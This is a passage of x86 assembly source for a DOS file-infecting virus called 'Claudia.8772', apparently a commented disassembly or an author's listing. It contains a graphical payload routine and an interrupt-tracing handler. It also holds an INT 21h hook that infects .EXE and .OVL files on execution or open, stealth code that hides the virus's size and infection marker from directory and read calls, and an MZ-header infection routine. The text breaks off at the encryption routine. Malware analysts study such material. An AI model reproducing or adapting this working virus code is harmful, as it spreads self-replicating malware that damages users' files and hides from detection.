            db      0d4h,57h,1fh,0c2h,45h,7fh,4ch,0bah,0c1h,0c1h,0c1h,0f1h
            db      1bh,4ch,1bh,84h,4ch,84h,0c1h,0e9h,73h,80h,12h,0c2h,5fh
            db      0c3h,12h,0c2h,5fh,12h,0c3h,5fh,0c2h,12h,73h,12h,0c2h,73h
            db      07h,0c2h,4eh,60h,29h,32h,60h,74h,0ah,5eh,51h,23h,6ch,05h
            db      1bh,6ah,29h,63h,0c2h,04h,0c2h,0dfh,14h,32h,1fh,0ffh,00h
            db      0ffh,00h,0ffh,00h,0ffh,00h,0c6h,00h,0c2h,57h,1fh,45h,5ch
            db      1bh,0c1h,0f1h,0bah,0dh,0c1h,0f1h,0c2h,1bh,5ch,1bh,0c2h
            db      4ch,1bh,80h,0c2h,6ah,1fh,09h,0c3h,2eh,1fh,60h,1fh,11h
            db      0c2h,34h,12h,5fh,34h,07h,34h,11h,0c2h,60h,4eh,29h,0c2h
            db      55h,30h,0ah,61h,59h,79h,55h,0c1h,0e0h,05h,0b3h,0c3h,32h
            db      0c1h,0dfh,0c2h,32h,14h,57h,34h,14h,0ffh,00h,0ffh,00h,0ffh
            db      00h,0ffh,00h,0c6h,00h,0ch,04h,02h,05h,75h,83h,82h,0bah
            db      0c3h,0afh,80h,1dh,07h,0c1h,86h,2ch,83h,51h,0bh,0c9h,0a3h
            db      5dh,0b5h,57h,0bh,24h,43h,43h,93h,6ch,1bh,0c8h,8bh,61h
            db      0e7h,0a6h,6eh,0c8h,0e3h,0d4h,48h,08h,05h,0aeh,0a3h,5fh
            db      0dbh,0c4h,81h,0c5h,0a4h,92h,0b9h,6fh,11h,0a3h,54h,0ah
            db      0deh,85h,34h,0b1h,83h,34h,81h,6eh,56h,0e7h,8bh,63h,49h
            db      28h,0ch,0b6h,71h,3fh,9eh,84h,6ch,09h,26h,24h,7fh,39h,08h
            db      4ah,63h,5ch,0c7h,94h,6bh,0c3h,93h,33h,0a7h,6dh,1ch,80h
            db      57h,3ch,0d5h,0c4h,0bbh,0e9h,0b3h,80h,0c3h,0b4h,98h,6dh
            db      24h,06h,0e7h,0e4h,0d1h,0c7h,0b3h,7ch,9eh,35h,06h,0b2h
            db      0c4h,0c5h,0cch,6fh,23h,27h,07h,05h,57h,45h,25h,9fh,58h
            db      39h,0d9h,98h,67h,0a8h,6eh,32h,0a0h,94h,76h,0c2h,85h,47h
            db      83h,60h,28h,0bdh,79h,15h,0d9h,0a4h,5fh,0a4h,62h,0ch,8bh
            db      0a4h,0a1h,81h,46h,0ch,0bch,0d4h,0d4h,4eh,45h,41h,0d9h
            db      0b8h,92h,0d6h,0d7h,0c7h,0a1h,95h,56h,4ah,34h,19h,0deh,93h
            db      3ah,0a2h,70h,50h,0d5h,74h,45h,0e7h,0abh,7fh,0c2h,95h,87h
            db      0e7h,0f3h,0e3h,0e8h,0b7h,90h,08h,15h,12h,90h,54h,0ah,0b1h
            db      96h,6eh,0b0h,0a8h,99h,0a2h,86h,52h,0d9h,0f3h,0eah,0d7h
            db      0d4h,0aah,6bh,10h,05h,6fh,34h,09h,0d1h,63h,29h,0b6h,63h
            db      13h,0a7h,79h,37h,28h,24h,0ch,0c2h,0b4h,0aeh,0f5h,0c3h,9bh
            db      0c1h,95h,4bh,0cch,0e2h,0dfh,0bah,7bh,40h,0d8h,0a8h,91h
            db      0a9h,78h,1eh,0e5h,0d8h,0bfh,0c5h,0a4h,78h,29h,16h,09h
            db      0d0h,88h,48h,90h,46h,0ah,0cfh,85h,2dh,0d5h,8dh,5fh,0a0h
            db      57h,20h,0b7h,70h,2ah,0c3h,9ch,6bh,72h,55h,30h,0bdh,79h
            db      30h,6dh,64h,54h,82h,62h,40h,2ah,36h,36h,0c2h,0c5h,0c1h
            db      0b1h,0b7h,0a3h,0d1h,95h,4dh,0a2h,63h,24h,0e6h,9bh,63h
            db      0b0h,8ah,69h,0e5h,0e6h,0e2h,70h,45h,16h,0dah,0a6h,76h
            db      0c9h,0d7h,0cdh,0b1h,88h,4fh,48h,18h,07h,9fh,46h,08h,0c5h
            db      7dh,3fh,87h,93h,82h,58h,28h,0ch,0dah,0c4h,0a0h,83h,7ah
            db      5ch,0d8h,9ch,7fh,0cah,0c5h,98h,0f4h,0a9h,70h,0ddh,8ch,4bh
            db      0f5h,0bbh,91h,0dbh,0e9h,0e2h,91h,39h,07h,90h,57h,23h,40h
            db      54h,4fh,54h,54h,54h,6eh,74h,6fh,83h,2bh,06h,6fh,54h,3eh
            db      0b4h,0b0h,82h,3eh,43h,46h,88h,86h,76h,1ch,37h,39h,74h,4eh
            db      41h,83h,6ch,3fh,5ch,70h,6ch,0d7h,0b4h,66h,96h,0b0h,0a9h
            db      0a3h,7bh,52h,46h,3bh,36h,0dah,0e4h,0d2h,0f0h,0cch,0b8h
            db      97h,94h,93h,0b2h,93h,56h,86h,94h,97h,0cdh,7ah,17h,0cah
            db      0d1h,0adh,9ch,0a2h,74h,7eh,7ch,76h,0ech,98h,50h,3ah,25h
            db      0dh,0b9h,64h,31h,9fh,65h,37h,0d6h,7dh,46h,6eh,3ah,2ah
            db      0adh,0b4h,0b6h,41h,5bh,67h,95h,2dh,06h,0f5h,0f6h,0f2h,3ah
            db      35h,29h,0f5h,9dh,66h,92h,76h,39h,6ah,1bh,06h,0b1h,9bh,8ah
            db      87h,89h,8bh,17h,04h,05h,0b6h,57h,29h,96h,8ch,88h,0f4h
            db      0b4h,81h,0f5h,0adh,7eh,18h,17h,13h,68h,6ch,6ah,6dh,49h
            db      2bh,91h,6fh,54h,92h,60h,1ch,0adh,47h,08h,8eh,21h,0ah,0cdh
            db      93h,30h,8fh,57h,37h,59h,37h,1ah,38h,17h,07h,59h,18h,06h
            db      0c4h,8dh,77h,0aah,0aeh,0b2h,5ah,65h,63h,91h,63h,39h,0a2h
            db      7ah,70h,1ah,27h,27h,37h,08h,04h,0d7h,0dch,0d6h,0e0h,95h
            db      50h,0e5h,0d5h,0a9h,28h,2ah,2bh,0c8h,0ddh,0ddh,37h,2ah,28h
            db      57h,0bh,05h,0ddh,7dh,62h,0c5h,70h,40h,97h,0a5h,0a5h,90h
            db      78h,56h,92h,6ch,39h,56h,3ch,32h,0b2h,0a5h,84h,91h,79h,6ch
            db      0bch,0ceh,0ach,0cah,0abh,5ch,0c3h,0ach,97h,0b3h,8bh,38h
            db      0d7h,0cch,0bdh,0e8h,0ebh,0d1h,0b4h,0cah,0cbh,0a4h,9ch,79h
            db      0f1h,0cbh,0a0h,0cah,0ech,0e3h,0c3h,0cch,0c6h,6dh,7ah,7bh
            db      6ah,5dh,50h,40h,4bh,4ah,0cdh,7ch,2fh,82h,52h,24h,46h,2ah
            db      1fh,0d6h,0bah,0a9h,0e8h,0f3h,0eeh,0e5h,0dch,0d3h,0e5h,9dh
            db      75h,0b1h,8ch,84h,0d9h,0b5h,7fh,38h,3bh,3bh,80h,48h,27h
            db      0c8h,0c6h,0afh,79h,8ch,88h,28h,4ch,50h,0dah,0cbh,8ch,0deh
            db      8ch,3ah,0a2h,8ch,6dh,0c5h,0bch,9dh,6fh,2ch,08h,0c8h,0bbh
            db      80h,9fh,3ch,07h,51h,4ch,4ah,0c6h,9ch,8ah,6fh,3ch,0fh,0c4h
            db      0bch,0b0h,0c7h,0ach,7ch,68h,6ch,5ch,0e4h,0eah,0e4h,0dah
            db      0cbh,0a1h,54h,5ch,5bh,98h,9dh,9eh,8bh,9ch,9eh,0adh,0bdh
            db      0bfh,0bh,01h,50h,0ch,0ah

   payload_     proc    near        ; Payload
            mov     ax,13h      ; Set video mode (graphic video RAM)
            int     10h

            mov     bx,0a000h       ; BX = segment of graphic video RAM
            mov     es,bx       ; ES =    "    "     "      "    "

            xor     di,di       ; Zero DI
            mov     cs:[bp+counter],di  ; Zero counter

            mov     di,9600h        ; DI = offset within graphic video...
   lod_nxt_byte:
            call    lod_img_byte
            and     ax,0000000011000000b
            cmp     ax,0000000011000000b
            jne     sto_img_byte    ; Not equal? Jump to sto_img_byte

            mov     al,cs:[bp+image_byte]
            and     ax,0000000000111111b
            push    ax          ; Save AX at stack

            call    lod_img_byte

            pop     cx          ; Load CX from stack (AX)
            rep     stosb       ; Store number of bytes within image

            jmp     exam_counter
   sto_img_byte:
            mov     al,cs:[bp+image_byte]
            stosb           ; Store byte within image
   exam_counter:
            cmp     di,0fA01h       ; End of video graphic RAM?
            jb      lod_nxt_byte    ; Below? Jump to lod_nxt_byte

            mov     cx,300h         ; Store seven hundred and sixty-ei...
            push    di          ; Save DI at stack
   store_loop:
            push    cx          ; Save CX at stack

            call    lod_img_byte
            stosb           ; Store byte within image

            pop     cx          ; Load CX from stack
            loop    store_loop

            pop     di          ; Load DI from stack

            push    ds          ; Save DS at stack

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     dx,di       ; DX = offset within graphic video...
            mov     si,di       ; SI = offset within graphic video...
            mov     cx,300h         ; Modify seven hundred and sixty-e...
   modify_loop:
            lodsb           ; AL = byte within graphic video RAM

            shr     al,01h      ; Shift logical right byte within ...
            shr     al,01h      ;   "      "      "    "     "     "

            stosb           ; Store byte within graphic video RAM

            loop    modify_loop

            pop     ds          ; Load DS from stack

            mov     ax,1012h        ; Set block of dac registers
            xor     bx,bx       ; BX = starting color register
            mov     cx,100h         ; CX = number of registers to set
            int     10h

            mov     ax,0c06h        ; Flush buffer and read standard i...
            mov     dx,0ffh         ; Direct console input
            int     21h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            segcs           ; Code segment as source segment
            lea     dx,[bp+message]     ; DX = offset of message
            call    write_string
   no_character:
            mov     ax,600h         ; Direct console input
            mov     dx,0FFh         ;   "       "      "
            int     21h
            jz      no_character    ; No character available? Jump to ...

            mov     ax,0c06h        ; Flush buffer and read standard i...
            mov     dx,0ffh         ; Direct console input
            int     21h

            mov     ax,03h      ; Set video mode (text video RAM)
            int     10h

            ret             ; Return!
            endp

   lod_img_byte proc    near        ; Load byte within image, increase...
            push    si          ; Save SI at stack

            mov     si,cs:[bp+counter]  ; SI = counter
            mov     al,cs:[bp+si+image] ; AL = byte within image

            mov     cs:[bp+image_byte],al

            inc     cs:[bp+counter]     ; Increase counter

            pop     si          ; Load SI from stack

            ret             ; Return!
            endp

   write_string proc    near        ; Write string to standard output
            mov     ah,09h      ;   "     "    "     "       "
            int     21h

            ret             ; Return!
            endp

   zero_regs    proc    near        ; Zero registers
            mov     si,100h         ; SI = offset of beginning of code

            xor     ax,ax       ; Zero AX
            xor     bx,bx       ; Zero BX
            xor     di,di       ; Zero DI
            xor     bp,bp       ; Zero BP

            ret             ; Return!
            endp

   dos_list_seg dw      ?           ; Segment of DOS list of lists
   virus_seg    dw      ?           ; Segment of virus in top of memory

   int01_virus  proc    near        ; Interrupt 01h of Claudia.8772
            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer

            push    ax          ; Save AX at stack
            mov     ax,[bp+04h]     ; AX = code segment

            push    bp          ; Save BP at stack
            call    delta_offse_
   delta_offse_:
            pop     bp          ; Load BP from stack

            cmp     ax,cs:[bp+(dos_list_seg-delta_offse_)]
            pop     bp          ; Load BP from stack
            jbe     found_seg       ; Below or equal? Jump to found_seg

            push    ds si       ; Save registers at stack
            mov     ds,ax       ; DS = code segment
            mov     si,[bp+02h]     ; SI = instruction pointer
            lodsb           ; AL = byte of opcode

            cmp     al,11001111b    ; IRET (opcode 0cfh)?
            je      iret_       ; Equal? Jump to iret_
            cmp     al,10011101b    ; POPF (opcode 9dh)?
            je      popf_       ; Equal? Jump to popf_

            jmp     int01_exit

            nop
   found_seg:
            push    es si       ; Save registers at stack

            call    delta_offs__
   delta_offs__:
            pop     si          ; Load SI from stack

            mov     si,cs:[si+(virus_seg-delta_offs__)]
            mov     es,si       ; ES = segment of virus in top of ...

            mov     word ptr es:[int21_addr+02h],ax

            mov     ax,[bp+02h]     ; AX = offset of interrupt 21h
            mov     word ptr es:[int21_addr],ax

            and     word ptr [bp+06h],1111111011111111b

            pop     si es       ; Load registers from stack

            jmp     int01_exit_

            nop
   iret_:
            or      word ptr [bp+0ah],0000000100000000b

            jmp     int01_exit

            nop
   popf_:
            or      word ptr [bp+06h],0000000100000000b
   int01_exit:
            pop     si ds       ; Load registers from stack
   int01_exit_:
            pop     ax          ; Load AX from stack
            pop     bp          ; Load BP from stack

            iret            ; Interrupt return!
            endp

   int24_virus  proc    near        ; Interrupt 24h of Claudia.8772
            mov     al,03h      ; Fail system call in progress

            iret            ; Interrupt return!
            endp

   int21_simula proc    near        ; Simulate interrupt 21h
            pushf           ; Save flags at stack
            call    cs:[int21_addr]

            ret             ; Return!
            endp

   ; ÄÄ´ Interrupt 21h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   int21_virus:    cmp ax,'CS'          ; Is she Claudia Schiffer?
           je  own_check    ; Let's speak with her :P

           cmp ax,4b00h     ; File execution?
           jz  file_exec    ; Then try to infect

           cmp ah,11h       ; FCB findfirst service?
           jz  fcb_stealth  ; Time to stealth

           cmp ah,12h       ; FCB findnext service?
           jz  fcb_stealth  ; Time to stealth

           cmp ah,4eh       ; Normal findfirst?
           jnz more_checks  ; Skip it if not

           jmp short file_stealth
           nop          ; Fifth nop (?)

   more_checks:    cmp ah,4fh       ; Normal findnext?
           jz  file_stealth     ; Gimme some stealth

           cmp ah,3dh       ; Getting file open?
           jnz is_it_xtended    ; Nah, maybe extended
           jmp file_open    ; Yes, go for it!

   is_it_xtended:  cmp ah,6ch       ; Extended file open?
           jnz check_read   ; Just if it is not
           jmp file_open    ; Also go for it!

   check_read: cmp ah,3fh       ; Any file being read?
           jnz check_chmod  ; Nope, just go on
           jmp file_read    ; Yes, do da stealth

   check_chmod:    cmp ax,5700h     ; NE1 getting attribs?
           jnz fcb_open?    ; Nah, just seemed so
           jmp file_chmod   ; Let's hide ourselves

   fcb_open?:  cmp ah,0fh       ; FCB file open service
           jnz fcb_get_size?    ; Not being used, np
           jmp fcb_file_open    ; Go and do some work

   fcb_get_size?:  cmp ah,23h       ; FCB get file size?
           jne int21_exit   ; Nope, no more checks
           jmp fcb_get_size     ; Yes, hide our size

   int21_exit:
           db  11101010b    ; 0eah, jmp xxxx:xxxx
   int21_addr  dd  ?        ; Original int 21h

   ; ÄÄ´ Residency check ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   own_check:  mov bx,'OS'          ; Virus author's nick as
           jmp int21_exit   ; response, we're alive!

   ; ÄÄ´ File execution ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   file_exec:  call    infect_file  ; Try to infect the file
           jmp int21_exit   ; in DS:DX and jump back

   ; ÄÄ´ FCB stealth ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   fcb_stealth:    call    int21_simula     ; Call original int 21h
           test    al,al        ; Check for errors and
           js  back_to_int  ; jump if there was any

           push    ax bx es     ; Push registers onto the
           mov ah,2fh       ; stack and get Disk
           int 21h      ; Transfer Area in ES:BX

           cmp byte ptr es:[bx],0ffh  ; Extended DTA?
           jnz not_extended           ; No need to add

           add bx,7         ; Make DTAs compatible
   not_extended:   mov ax,es:[bx+19h]   ; Get size into AX and
           cmp ah,64h       ; check if the file is
           jb  leave_stealth    ; already infected

           ror ah,1         ; Yes, set original size
           sub ah,64h       ; and date back to remain
           rol ah,1         ; completely stealth
           mov es:[bx+19h],ax
           sub word ptr es:[bx+1dh],virus_size
           sbb word ptr es:[bx+1fh],0

   leave_stealth:  pop es bx ax     ; Pop registers and return
   back_to_int:    iret             ; to the interrupt call

   ; ÄÄ´ File stealth ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   file_stealth:   call    int21_simula     ; Call original int 21h
           jnb call_was_ok  ; Check for errors and
           retf    2        ; leave if there are any

   call_was_ok:    push    ax bx si es  ; Push registers and get
           mov ah,2fh       ; the file DTA in ES:BX
           int 21h

           mov ax,es:[bx+18h]   ; Get file date in AX
           cmp ah,64h       ; and check if this file
           jb  nothing_to_do    ; is already infected

           ror ah,1         ; If it is, restore both
           sub ah,64h       ; original date and size
           rol ah,1         ; to hide our presence
           mov es:[bx+18h],ax
           sub word ptr es:[bx+1ah],virus_size
           sbb word ptr es:[bx+1ch],0

   nothing_to_do:  pop es si bx ax  ; Pop registers, clear
           clc          ; carry flag and do a
           retf    2        ; return far to caller

   ; ÄÄ´ FCB file open ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   fcb_file_open:  call    process_file     ; Process file infection
   fcb_get_size:   call    int21_simula     ; Call original int 21h
           test    al,al        ; Check for possible errors
           js  do_retf_2    ; when having called it

           push    bx ax        ; Push registers onto stack
           mov bx,dx        ; Now get the file date in
           mov ax,[bx+14h]  ; AX by means of the FCB
           cmp ah,64h       ; structure and check for
           jb  just_leave   ; previous file infection

           ror ah,1         ; In case it's infected,
           sub ah,64h       ; restore original date and
           ror ah,1         ; size momentaneously :)
           mov [bx+14h],ax
           sub word ptr [bx+10h],virus_size
           sbb word ptr [bx+12h],0

   just_leave: pop ax bx        ; Pop registers and do a
           retf    2        ; return far to caller

   ; ÄÄ´ Normal file open ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   file_open:  call    process_file     ; Process file infection
           call    int21_simula     ; Call original int 21h
           jb  do_retf_2    ; Has there been any error?

           cmp ax,5         ; Check for file handle
           jb  not_valid    ; Skip it if not valid

           push    ax bx di es  ; Push registers onto stack
           xchg    ax,bx        ; and get Job File Table
           push    bx       ; in ES:DI, making possible
           mov ax,1220h     ; the retrieval of the SFT
           int 2fh

           nop          ; Sixth nop (?)
           mov bl,es:[di]   ; Now go actually for the
           mov ax,1216h     ; System File Table which
           int 2fh      ; corresponds to this file

           pop bx       ; Restore file handle
           call    check_marker     ; Check if it's infected
           jb  dont_stealth     ; Only if it is not :)

           cmp word ptr es:[di],1  ; No more than one handle
           ja  dont_stealth        ; referring to this file

           sub word ptr es:[di+11h],virus_size
           sbb word ptr es:[di+13h],0

   dont_stealth:   pop es di bx ax  ; Pop registers and leave
   not_valid:  clc          ; once we've substracted
   do_retf_2:  retf    2        ; our size on the fly

   ; ÄÄ´ File read ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   file_read:  cmp bx,5         ; Check if current file
           jnb good_handle  ; handle is valid, and
           jmp exit_read    ; leave if it is not

   good_handle:    push    si di es     ; Push used registers
           push    ax bx cx bx  ; onto the stack :P

           mov ax,1220h     ; Get Job File Table in
           int 2fh      ; ES:DI (once again)

           nop          ; Seventh nop (?)
           mov bl,es:[di]   ; And now get the System
           mov ax,1216h     ; File Table for the
           int 2fh      ; current file in ES:DI

           pop bx       ; Restore file handle
           call    check_marker     ; Check if this file is
           jnb roq_me_babe  ; already infected and
           jmp pop_and_exit     ; just leave if it's not

   roq_me_babe:    cmp word ptr es:[di+17h],0  ; Are too many bytes
           jz  lets_surf       ; being read so as
           jmp pop_and_exit        ; to care about it?

   lets_surf:  cmp word ptr es:[di+15h],1ch  ; File pointer in
           jnb pop_and_exit          ; the MZ header?

           push    word ptr es:[di+15h]  ; Push actual pointer
           mov ah,3fh            ; and perform a read
           call    int21_simula          ; with the original int

           pop cx       ; Actual pointer in CX
           push    ax       ; Now save bytes read
           sub cx,1ch       ; Substract the MZ size
           neg cx       ; Negate operation
           cmp ax,cx        ; Compare AX and CX
           jnb dont_swap    ; Do we need to swap?

           xchg    ax,cx        ; Do da boogie-boogie
   dont_swap:  push    ds cx dx     ; Push used registers

           push    word ptr es:[di+15h]  ; Save read pointer
           push    word ptr es:[di+17h]  ; Save read pointer

           add word ptr es:[di+11h],virus_size
           adc word ptr es:[di+13h],0

           mov ax,es:[di+11h]   ; Now we've restored the
           sub ax,1ch       ; actual file size, which
           mov es:[di+15h],ax   ; includes the virus body,
           mov ax,es:[di+13h]   ; so as to recover the
           mov es:[di+17h],ax   ; original MZ header

           push    cs       ; Push CS and pop DS to
           pop ds       ; make them equivalent

           mov dx,offset exe_header  ; Read the original
           mov cx,1ch            ; MZ header from the
           mov ah,3fh            ; virus body, where
           call    int21_simula          ; it is stored

           sub word ptr es:[di+11h],virus_size
           sbb word ptr es:[di+13h],0

           pop word ptr es:[di+17h]  ; Set the stealthed size
           pop word ptr es:[di+15h]  ; and the read pointers

           pop dx cx ds     ; Pop registers from stack
           push    ds       ; Now do segment push/pop,
           pop es       ; so we get CS = DS = ES

           mov di,dx             ; Move the original MZ
           mov si,offset exe_header  ; header back to the
           push    cs            ; start of the file
           pop ds            ; which is being read
           rep movsb             ; (only in memory)

           push    es       ; Play one more time with
           pop ds       ; the segment shit :P

           pop ax cx bx     ; Pop registers from the
           pop es es di si  ; stack, clear carry flag
           clc          ; and return far to our
           retf    2        ; caller, stealth is done

   pop_and_exit:   pop cx bx ax     ; Pop registers and jump
           pop es di si     ; back straight to the
   exit_read:  jmp int21_exit   ; interrupt 21h exit routine

   ; ÄÄ´ Get file attributes ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   file_chmod: call    int21_simula     ; Call original int 21h
           jb  just_git_out     ; Jump in case of error

           cmp dh,64h       ; Check the file date for
           jb  back_to_chmod    ; our infection mark

           ror dh,1         ; Restore original date
           sub dh,64h       ; if the file is infected,
           rol dh,1         ; so we remain stealth

   back_to_chmod:  iret             ; Do an interrupt return
   just_git_out:   retf    2        ; Do a return far

   ; ÄÄ´ File processing routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   process_file:   push    di es cx ax  ; Push pertinent registers
           cmp ax,6c00h     ; Check for extended open
           jnz normal_open  ; AX != 6c00h -> AX = 3d00h

           xchg    dx,si        ; Change DS:SI to DS:DX
   normal_open:    mov di,dx        ; Now process filename in
           push    ds       ; order to find a dot and
           pop es       ; then compare its extension
           mov cx,40h       ; with our valid wildcards,
           mov al,'.'           ; so we know whether we can
           repne   scasb        ; infect it or not...

           pop ax       ; Restore AX and jump if
           jcxz    jump_back    ; no fucking dot was found

           cmp word ptr [di],'XE'  ; Is it an .EX*?
           jnz check_ovl       ; No, next check

           cmp byte ptr [di+2],'E' ; Is it an .EXE?
           jnz jump_back       ; Nope, just leave
           jmp go_for_it       ; Yes, infect it!

           nop             ; Eighth nop (?)
   check_ovl:  cmp word ptr [di],'VO'  ; Is it an .OV*?
           jnz jump_back       ; Nah, bad luck

           cmp byte ptr [di+2],'L' ; It is an .OVL?
           jnz jump_back       ; No way, fool
   go_for_it:  call    infect_file     ; Lucky strike ;)

   jump_back:  cmp ah,6ch       ; Check if it's necessary
           jnz dont_xchg    ; to swap DX and SI again,
                        ; in case the call was an
           xchg    dx,si        ; extended open (6c00h),
   dont_xchg:  pop cx es di     ; then return to our caller
           ret

   ; ÄÄ´ File infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   infect_file:    push    ax bx cx dx  ; Push registers which are
           push    si di ds es  ; modified in this routine

           in  al,21h       ; Int controller, 8259A
           xor al,2         ; Xor the value with 2
           out 21h,al       ; Int controller, 8259A
           xor al,2         ; Xor the value with 2
           out 21h,al       ; Int controller, 8259A

           mov ax,3d00h     ; Open file in DS:DX
           call    int21_simula     ; in read-only mode
           jnb go_ahead     ; Check for possible
           jmp quit_this    ; errors in opening

           nop          ; Nineth nop (?)
   go_ahead:   xor bx,bx        ; Set our own int 24h
           mov ds,bx
           mov word ptr ds:[24h*4],offset int24_virus
           mov word ptr ds:[24h*4+2],cs
           xchg    ax,bx
           push    bx       ; Save file handle

           mov ax,1220h     ; Now get again file Job
           int 2fh      ; File Table in ES:DI

           nop          ; Tenth nop (?)
           mov bl,es:[di]   ; Go get System File Table
           mov ax,1216h     ; in ES:DI for our further
           int 2fh      ; checks of this file

           pop bx       ; Restore file handle
           call    check_marker     ; Is it already infected?
           jnb close_n_pop  ; Close it if it is

           mov word ptr es:[di+2],2  ; Change open mode
           push    cs            ; to read/write and
           pop ds            ; make CS == DS

           mov dx,offset exe_header  ; Read the first 1ch
           mov cx,1ch            ; bytes of the EXE
           mov ah,3fh            ; and check for "MZ"
           call    int21_simula

           cmp word ptr ds:[exe_header],'ZM'  ; EXE magic?
           jz  is_it_newexe?

   close_n_pop:    mov ah,3eh       ; Close the file if something
           call    int21_simula     ; something has gone wrong,
   quit_this:  jmp pop_and_leave    ; pop registers and leave

   is_it_newexe?:  cmp word ptr ds:[exe_header+18h],40h
           jnz any_overlay?
           jmp pop_and_leave    ; Only if it is a NewEXE

   any_overlay?:   cmp word ptr ds:[exe_header+1ah],0
           jz  bless_victim
           jmp pop_and_leave    ; Or if it has overlays

   bless_victim:   push    es di cs          ; Our victim is ok to
           pop es            ; be infected, so we
           mov si,offset exe_header  ; just go straight to
           mov di,offset new_header  ; it... first move the
           mov cx,1ch            ; MZ header to another
           rep movsb             ; read buffer :)

           pop di es             ; Restore registers
           push    word ptr es:[di+11h]  ; and save file size,
           push    word ptr es:[di+13h]  ; given by the SFT

           push    word ptr ds:[exe_header+16h]  ; Save original
           pop [initial_cs_]             ; CS pointer in
           add [initial_cs_],10h         ; our own code

           push    word ptr ds:[exe_header+14h]  ; Save also the
           pop [initial_ip_]             ; IP (14h) field

           push    word ptr ds:[exe_header+0eh]  ; Do the same we
           pop [initial_ss]              ; did with CS with
           add [initial_ss],10h          ; the stack segment

           push    word ptr ds:[exe_header+10h]  ; And also save
           pop [initial_sp]              ; the stack pointer

           pop dx ax        ; Get file size in DX:AX
           push    ax dx bx     ; and save them and BX

           mov cl,0ch       ; I said, uh, hip-hop, the
           shl dx,cl        ; hibbe to the hibbe, the
           mov bx,ax        ; hip-hip-uh-hop, you don't
           mov cl,4         ; stop the rockin' to the
           shr bx,cl        ; bang-bang boogie, say up,
           add dx,bx        ; jump the boogie to the
           and ax,0fh       ; rhythm of the boogety beat!

           pop bx               ; Get handle
           sub dx,word ptr ds:[exe_header+8]    ; Header size
           mov word ptr ds:[exe_header+16h],dx  ; in paras and
           mov word ptr ds:[exe_header+14h],ax  ; new CS:IP
           pop dx ax

           add ax,virus_size    ; Add virus size to AX
           nop          ; Eleventh nop (?)
           adc dx,0         ; And add with carry
           push    ax dx        ; Save AX:DX again

           mov cl,4         ; Now let's calculate
           shr ax,cl        ; the necessary values
           add ax,0c8h      ; for the SS:SP fields

           cmp ax,word ptr ds:[exe_header+0eh]
           jb  dont_update
                        ; Modify the thing
           mov dx,0fffeh
           mov word ptr ds:[exe_header+0eh],ax
           mov word ptr ds:[exe_header+10h],dx

   dont_update:    pop dx ax        ; Pop file length
           mov cx,200h      ; Calculate the number of
           div cx       ; pages and write it
           inc ax
           mov word ptr ds:[exe_header+2],dx  ; Update these
           mov word ptr ds:[exe_header+4],ax  ; MZ pointers

           mov ax,4202h     ; Lseek to the end of the
           cwd          ; file, we're gonna append
           xor cx,cx        ; the viral code to it at
           call    int21_simula     ; last, it took its time :)

           mov ax,word ptr ds:[exe_header+14h]
           call    encrypt_virus

           mov dx,offset new_header  ; Now write the fuckin
           mov cx,1ch            ; MZ header to the end,
           mov ah,40h            ; guess foe what? :P
           call    int21_simula

           mov word ptr es:[di+15h],0  ; Lseek to the start
           mov word ptr es:[di+17h],0  ; by means of the SFT

           mov dx,offset exe_header  ; Write our cooler MZ
           mov ah,40h            ; header and replace
           call    int21_simula          ; the original one

           mov cx,es:[di+0dh]   ; Now just prepare our
           mov dx,es:[di+0fh]   ; infection mark so as
           ror dh,1         ; to easily distinguish
           add dh,64h       ; later our infectees
           rol dh,1         ; when needing to stealth
           mov ax,5701h     ; or just to not to do
           call    int21_simula     ; any kinda reinfection

           mov ah,3eh       ; Close file in BX, we
           call    int21_simula     ; have just infected it

   pop_and_leave:  pop es ds di si  ; Restore every register
           pop dx cx bx ax  ; we had pushed before
           ret          ; and return to our caller

   ; ÄÄ´ Virus encryption routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

